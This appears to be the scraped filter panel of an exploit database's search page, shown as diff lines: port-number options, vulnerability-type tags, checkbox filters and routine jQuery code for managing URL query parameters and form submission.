+                                        8081
+                                    
+
+                                        8082
+                                    
+
+                                        8088
+                                    
+
+                                        8090
+                                    
+
+                                        8181
+                                    
+
+                                        8300
+                                    
+
+                                        8400
+                                    
+
+                                        8443
+                                    
+
+                                        8445
+                                    
+
+                                        8473
+                                    
+
+                                        8500
+                                    
+
+                                        8585
+                                    
+
+                                        8619
+                                    
+
+                                        8800
+                                    
+
+                                        8812
+                                    
+
+                                        8839
+                                    
+
+                                        8880
+                                    
+
+                                        8888
+                                    
+
+                                        9000
+                                    
+
+                                        9001
+                                    
+
+                                        9002
+                                    
+
+                                        9080
+                                    
+
+                                        9090
+                                    
+
+                                        9091
+                                    
+
+                                        9100
+                                    
+
+                                        9124
+                                    
+
+                                        9200
+                                    
+
+                                        9251
+                                    
+
+                                        9256
+                                    
+
+                                        9443
+                                    
+
+                                        9447
+                                    
+
+                                        9784
+                                    
+
+                                        9788
+                                    
+
+                                        9855
+                                    
+
+                                        9876
+                                    
+
+                                        9900
+                                    
+
+                                        9987
+                                    
+
+                                        9993
+                                    
+
+                                        9999
+                                    
+
+                                        10000
+                                    
+
+                                        10001
+                                    
+
+                                        10080
+                                    
+
+                                        10202
+                                    
+
+                                        10203
+                                    
+
+                                        10443
+                                    
+
+                                        10616
+                                    
+
+                                        11000
+                                    
+
+                                        11211
+                                    
+
+                                        11460
+                                    
+
+                                        12203
+                                    
+
+                                        12221
+                                    
+
+                                        12345
+                                    
+
+                                        12397
+                                    
+
+                                        12401
+                                    
+
+                                        13327
+                                    
+
+                                        13701
+                                    
+
+                                        13722
+                                    
+
+                                        13838
+                                    
+
+                                        16992
+                                    
+
+                                        18821
+                                    
+
+                                        18881
+                                    
+
+                                        19000
+                                    
+
+                                        19810
+                                    
+
+                                        19813
+                                    
+
+                                        20000
+                                    
+
+                                        20010
+                                    
+
+                                        20031
+                                    
+
+                                        20111
+                                    
+
+                                        20171
+                                    
+
+                                        22003
+                                    
+
+                                        23423
+                                    
+
+                                        25672
+                                    
+
+                                        26000
+                                    
+
+                                        27015
+                                    
+
+                                        27700
+                                    
+
+                                        28015
+                                    
+
+                                        30000
+                                    
+
+                                        30303
+                                    
+
+                                        31337
+                                    
+
+                                        32400
+                                    
+
+                                        32674
+                                    
+
+                                        32764
+                                    
+
+                                        34205
+                                    
+
+                                        37215
+                                    
+
+                                        37777
+                                    
+
+                                        37848
+                                    
+
+                                        38292
+                                    
+
+                                        40007
+                                    
+
+                                        41523
+                                    
+
+                                        44334
+                                    
+
+                                        46824
+                                    
+
+                                        48080
+                                    
+
+                                        49152
+                                    
+
+                                        50000
+                                    
+
+                                        50496
+                                    
+
+                                        52311
+                                    
+
+                                        52789
+                                    
+
+                                        52869
+                                    
+
+                                        52986
+                                    
+
+                                        53413
+                                    
+
+                                        54345
+                                    
+
+                                        54890
+                                    
+
+                                        55554
+                                    
+
+                                        55555
+                                    
+
+                                        56380
+                                    
+
+                                        57772
+                                    
+
+                                        58080
+                                    
+
+                                        62514
+                                    
+
+
+
+Tag
+
+
+
+                                        WordPress Core
+                                    
+
+                                        Metasploit Framework (MSF)
+                                    
+
+                                        WordPress Plugin
+                                    
+
+                                        SQL Injection (SQLi)
+                                    
+
+                                        Cross-Site Scripting (XSS)
+                                    
+
+                                        File Inclusion (LFI/RFI)
+                                    
+
+                                        Cross-Site Request Forgery (CSRF)
+                                    
+
+                                        Denial of Service (DoS)
+                                    
+
+                                        Code Injection
+                                    
+
+                                        Command Injection
+                                    
+
+                                        Authentication Bypass / Credentials Bypass (AB/CB)
+                                    
+
+                                        Client Side
+                                    
+
+                                        Use After Free (UAF)
+                                    
+
+                                        Out Of Bounds
+                                    
+
+                                        Remote
+                                    
+
+                                        Local
+                                    
+
+                                        XML External Entity (XXE)
+                                    
+
+                                        Integer Overflow
+                                    
+
+                                        Server-Side Request Forgery (SSRF)
+                                    
+
+                                        Race Condition
+                                    
+
+                                        NULL Pointer Dereference
+                                    
+
+                                        Malware
+                                    
+
+                                        Buffer Overflow
+                                    
+
+                                        Heap Overflow
+                                    
+
+                                        Type Confusion
+                                    
+
+                                        Object Injection
+                                    
+
+                                        Bug Report
+                                    
+
+                                        Console
+                                    
+
+                                        Pwn2Own
+                                    
+
+                                        Traversal
+                                    
+
+                                        Deserialization
+                                    
+
+
+
+
+
+
+
+
+                                    Verified
+
+                                    
+
+
+
+
+
+
+
+                                    Has App
+
+                                    
+
+
+
+
+
+
+
+                                    No Metasploit
+
+                                    
+
+
+
+
+
+
+
+
+Search
+
+
+
+
+
+
+
+
+
+
+
+
+    .dataTables_filter input {
+        font-size: 16px;
+    }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    window.addEventListener('popstate', () => {
+        location.reload();
+    }, false);
+
+    $(function () {
+        $('[data-toggle="tooltip"]').tooltip()
+    })
+
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+
+    function removeURLParameter(url, parameter) {
+        //prefer to use l.search if you have a location/link object
+        var urlparts= url.split('?');
+        if (urlparts.length>=2) {
+
+            var prefix= encodeURIComponent(parameter)+'=';
+            var pars= urlparts[1].split(/[&;]/g);
+
+            //reverse iteration as may be destructive
+            for (var i= pars.length; i-- > 0;) {
+                //idiom for string.startsWith
+                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
+                    pars.splice(i, 1);
+                }
+            }
+
+            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
+            window.history.pushState('', document.title, url);
+            return url;
+        } else {
+            window.history.pushState('', document.title, url);
+            return url;
+        }
+    }
+
+    function showFilters() {
+        var x = document.getElementById("exploitFiltersCard");
+        if (x.style.display === "none") {
+            x.style.display = "block";
+        } else {
+            x.style.display = "none";
+        }
+    }
+
+    function updateQueryString(key, value, url) {
+        if (!url) url = window.location.href;
+        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
+            hash;
+
+        if (re.test(url)) {
+            if (typeof value !== 'undefined' && value !== null)
+                return url.replace(re, '$1' + key + "=" + value + '$2$3');
+            else {
+                hash = url.split('#');
+                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
+                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
+                    url += '#' + hash[1];
+
+                window.history.pushState('', document.title, url);
+                return url;
+            }
+        }
+        else {
+            if (typeof value !== 'undefined' && value !== null) {
+                var separator = url.indexOf('?') !== -1 ? '&' : '?';
+                hash = url.split('#');
+                url = hash[0] + separator + key + '=' + value;
+                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
+                    url += '#' + hash[1];
+
+                window.history.pushState('', document.title, url);
+                return url;
+            }
+            else
+                window.history.pushState('', document.title, url);
+                return url;
+        }
+    }
+
+    $('#search').submit(function() {
+        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
+        return true; // ensure form still submits
+    });
+
+    // Un-disable form fields when page loads, in case they click back after submission
+    $('#search').find( ":input" ).prop( "disabled", false );
+
+    // If the ajax call fails, throw the error to the console instead of
+    // popping up an alert to the user
+    $.fn.dataTable.ext.errMode = 'throw';
+
+
+
